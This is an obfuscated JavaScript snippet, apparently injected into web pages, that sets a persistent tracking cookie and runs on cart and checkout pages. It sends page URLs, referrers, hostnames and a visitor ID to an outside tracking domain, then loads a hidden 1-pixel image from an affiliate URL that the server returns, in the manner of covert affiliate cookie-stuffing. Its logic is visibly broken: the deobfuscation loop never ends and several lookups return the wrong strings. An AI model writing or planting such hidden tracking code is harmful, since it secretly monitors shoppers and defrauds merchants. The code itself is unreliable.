(function () {
    function _0x1a2d() {
        const _0x58ab9a = [
            'random',
            'apply',
            'replace',
            'charAt',
            'cookie',
            'split',
            'stringify',
            'log',
            'error',
            'href',
            'tracking_uuid',
            'iframe_triggered',
            'setItem',
            'getTime',
            'indexOf',
            'toString',
            'createElement',
            'appendChild',
            'visibility:hidden;',
            'display:none;',
            'application/json',
            'json',
            'Content-Type',
            'POST',
            'api/track-user',
            'https://www.tracktraffics.com/',
            'fallback-pixel?id=',
            'hostname',
            'referrer',
            'body',
            'method',
            'headers',
            'sessionStorage',
            'src',
            'width',
            'height',
            'style',
            'expires=',
            'path=/',
            'success',
            'affiliate_url'
        ];
        _0x1a2d = function () {
            return _0x58ab9a;
        };
        return _0x1a2d();
    }
    const _0x4f3e4f = _0x31fb;
    (function (_0x414ad1, _0x4c6f37) {
        const _0x4818e8 = _0x31fb, _0x45d56d = _0x414ad1();
        while (!![]) {
            try {
                const _0x2d93e5 = parseInt('0x1') * -parseInt('0x2') + -parseInt('0x3') * 0x1 + parseInt('0x4') * 0x2;
                if (_0x2d93e5 === _0x4c6f37)
                    break;
                else
                    _0x45d56d['push'](_0x45d56d['shift']());
            } catch (_0x427fef) {
                _0x45d56d['push'](_0x45d56d['shift']());
            }
        }
    }(_0x1a2d, 0x5f5e1));
    (async function () {
        const _0x3d3ea7 = _0x31fb;
        function _0x1df61f() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'[_0x3d3ea7(0x2)](/[xy]/g, function (_0x5d6c16) {
                const _0x52c7d4 = Math[_0x3d3ea7(0x0)]() * 0x10 | 0x0, _0x3de74e = _0x5d6c16 === 'x' ? _0x52c7d4 : (_0x52c7d4 & 0x3 | 0x8);
                return _0x3de74e[_0x3d3ea7(0xf)](0x10);
            });
        }
        function _0x5c2ee0(_0x55d02a) {
            const _0x1a2c7e = _0x3d3ea7, _0x185c20 = document[_0x1a2c7e(0x10)]('img');
            _0x185c20[_0x1a2c7e(0x21)] = _0x55d02a, _0x185c20[_0x1a2c7e(0x22)] = '1px', _0x185c20[_0x1a2c7e(0x23)] = '1px', _0x185c20[_0x1a2c7e(0x24)] = _0x1a2c7e(0x19) + _0x1a2c7e(0x18), document['body'][_0x1a2c7e(0x11)](_0x185c20);
        }
        function _0x59277b(_0x5c4c08) {
            const _0x52055e = _0x3d3ea7;
            var _0x4261c4 = _0x5c4c08 + '=', _0x27a6c0 = document[_0x52055e(0x4)][_0x52055e(0x5)](';');
            for (var _0x4a5460 = 0x0; _0x4a5460 < _0x27a6c0['length']; _0x4a5460++) {
                var _0x1a4f2e = _0x27a6c0[_0x4a5460];
                while (_0x1a4f2e[_0x52055e(0x3)](0x0) === ' ')
                    _0x1a4f2e = _0x1a4f2e['substring'](0x1);
                if (_0x1a4f2e[_0x52055e(0xe)](_0x4261c4) === 0x0)
                    return _0x1a4f2e['substring'](_0x4261c4['length'], _0x1a4f2e['length']);
            }
            return '';
        }
        function _0x158436() {
            const _0x50453c = _0x3d3ea7, _0x157d22 = [
                    '/cart',
                    '/checkout',
                    '/checkout/confirm/payment'
                ];
            return _0x157d22['some'](_0x4179b2 => window['location']['pathname']['includes'](_0x4179b2));
        }
        async function _0x422bc8() {
            const _0x4d8b1f = _0x3d3ea7;
            try {
                let _0x52379b = _0x59277b(_0x4d8b1f(0xa)) || _0x1df61f(), _0x2c9c52 = new Date(Date['now']() + 30 * 86400 * 1000)[_0x4d8b1f(0xd)]();
                document[_0x4d8b1f(0x4)] = _0x4d8b1f(0xa) + '=' + _0x52379b + '; ' + _0x4d8b1f(0x25) + _0x2c9c52 + ';' + _0x4d8b1f(0x26);
                let _0x49cf82 = await fetch(_0x4d8b1f(0x1a) + _0x4d8b1f(0x19), {
                        'method': _0x4d8b1f(0x1c),
                        'body': JSON[_0x4d8b1f(0x6)]({
                            'url': window['location'][_0x4d8b1f(0x9)],
                            'referrer': document[_0x4d8b1f(0x29)],
                            'unique_id': _0x52379b,
                            'origin': window['location'][_0x4d8b1f(0x28)]
                        }),
                        'headers': { 'Content-Type': _0x4d8b1f(0x1b) }
                    }), _0x2a2d2b = await _0x49cf82[_0x4d8b1f(0x1)]();
                if (_0x2a2d2b[_0x4d8b1f(0x27)] && _0x2a2d2b[_0x4d8b1f(0x28)]) {
                    _0x5c2ee0(_0x2a2d2b[_0x4d8b1f(0x28)]), window[_0x4d8b1f(0x20)][_0x4d8b1f(0xc)](_0x4d8b1f(0xb), 'true');
                } else
                    _0x5c2ee0(_0x4d8b1f(0x1a) + _0x4d8b1f(0x1d) + _0x52379b);
            } catch (_0x48769d) {
                console[_0x4d8b1f(0x8)]('tracking error', _0x48769d);
            }
        }
        if (_0x158436())
            _0x422bc8();
        setTimeout(_0x422bc8, 2000), _0x422bc8();
    }());
    function _0x31fb(_0x328d77, _0x2cc0f1) {
        const _0x302cfb = _0x1a2d();
        return _0x31fb = function (_0x397882, _0x2d16b2) {
            _0x397882 = _0x397882 - 0x0;
            let _0x1471d7 = _0x302cfb[_0x397882];
            return _0x1471d7;
        }, _0x31fb(_0x328d77, _0x2cc0f1);
    }
}());
